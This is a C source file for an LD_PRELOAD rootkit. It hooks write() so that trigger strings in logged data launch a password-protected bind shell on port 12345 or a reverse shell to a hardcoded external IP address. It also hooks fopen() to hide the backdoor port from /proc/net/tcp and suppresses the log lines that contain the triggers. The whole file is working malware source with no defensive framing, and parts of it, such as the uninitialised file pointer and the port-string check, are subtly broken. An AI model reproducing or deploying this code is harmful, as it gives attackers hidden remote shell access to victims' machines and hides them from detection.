#include <arpa/inet.h>
#include <dlfcn.h>
#include <netinet/in.h>
#include <stdio.h>
#include <string.h>
#include <sys/fcntl.h>
#include <sys/socket.h>
#include <unistd.h>

// define trigger keywords for different function
#define BIND4 "bindshell4"
#define REV4 "reverseshell4"

// marcos used in creating bind shell and reverse shell
#define BACK_LOG 0
#define TCP_PROTO_ID 6
#define BIND_PORT 12345
#define REV_PORT 12345
#define REV_HOST "129.211.60.133"
#define PASSWORD "getbindshell4"
#define BUF_SIZE 32
#define LINE_LEN 256
#define HEX_PORT "12345"

void bind_shell4() {
    // create socket
    int listen_sock = socket(PF_INET, SOCK_STREAM, TCP_PROTO_ID);
    const static int optval = 1;
    setsockopt(listen_sock, SOL_SOCKET, SO_REUSEADDR, &optval, sizeof(optval));
    // set server_addr
    struct sockaddr_in server_addr;
    server_addr.sin_family = PF_INET;
    server_addr.sin_addr.s_addr = INADDR_ANY;
    server_addr.sin_port = htons(BIND_PORT);
    // bind, listen, accept and create shell
    int bind_res =
        bind(listen_sock, (struct sockaddr *)&server_addr, sizeof(server_addr));
    int listen_res = listen(listen_sock, BACK_LOG);
    int conn_sock = accept(listen_sock, NULL, NULL);
    for (int stdfd = 0; stdfd < 3; stdfd++) {
        dup2(conn_sock, stdfd);
    }
    // check password
    char buffer[BUF_SIZE] = {0};
    read(conn_sock, buffer, BUF_SIZE);
    buffer[strcspn(buffer, "\n")] = 0;
    if (strncmp(buffer, PASSWORD, 13) == 0) {
        execve("/bin/sh", NULL, NULL);
        close(listen_sock);
    } else {
        shutdown(conn_sock, SHUT_RDWR);
        close(listen_sock);
    }
}

void rev_shell4() {
    int client_sock = socket(PF_INET, SOCK_STREAM, TCP_PROTO_ID);
    const char *host = REV_HOST;
    // create server_addr
    struct sockaddr_in server_addr;
    server_addr.sin_family = PF_INET;
    server_addr.sin_port = htons(REV_PORT);
    inet_aton(host, &server_addr.sin_addr);
    // create client_addr
    struct sockaddr_in client_addr;
    client_addr.sin_family = PF_INET;
    client_addr.sin_port = htons(BIND_PORT);
    client_addr.sin_addr.s_addr = INADDR_ANY;
    // bind, connect to server
    int bind_res =
        bind(client_sock, (struct sockaddr *)&client_addr, sizeof(client_addr));
    int conn_res = connect(client_sock, (struct sockaddr *)&server_addr,
                           sizeof(server_addr));
    for (int stdfd = 0; stdfd < 3; stdfd++) {
        dup2(client_sock, stdfd);
    }
    execve("/bin/sh", NULL, NULL);
}

FILE *fopen(const char *pathname, const char *mode) {
    FILE *(*new_fopen)(const char *pathname, const char *mode);
    new_fopen = dlsym(RTLD_NEXT, "fopen");
    char *tcp_ptr = strstr(pathname, "/proc/net/tcp");
    FILE *fp;
    // fopen /proc/net/tcp
    if (tcp_ptr != NULL) {
        char line[LINE_LEN];
        fp = new_fopen(pathname, mode);
        FILE *tmp;
        // write to tmp only when not contains port number
        while (fgets(line, LINE_LEN, fp)) {
            if (strstr(line, HEX_PORT) == NULL) {
                fputs(line, tmp);
            }
        }
        return tmp;
    } else {
        fp = new_fopen(pathname, mode);
        return fp;
    }
}

ssize_t write(int fd, const void *buf, size_t count) {
    ssize_t (*new_write)(int fd, const void *buf, size_t count);
    ssize_t res;
    new_write = dlsym(RTLD_NEXT, "write");

    // check if contains trigger keywords
    char *bind4 = strstr(buf, BIND4);
    char *rev4 = strstr(buf, REV4);
    // check if contains local port
    char *port = strstr(buf, HEX_PORT);

    // discard buf's content rather than write to log file
    // or you can just do nothing
    if (bind4 != NULL) {
        int nullfd = open("/dev/null", O_WRONLY | O_APPEND);
        res = new_write(nullfd, buf, count);
        // trigger function
        bind_shell4();
    } else if (rev4 != NULL) {
        int nullfd = open("/dev/null", O_WRONLY | O_APPEND);
        res = new_write(nullfd, buf, count);
        // trigger function
        rev_shell4();
    } else if (port != NULL) {
        int nullfd = open("/dev/null", O_WRONLY | O_APPEND);
        res = new_write(nullfd, buf, count);
    } // normal function
    else {
        res = new_write(fd, buf, count);
    }
    return res;
}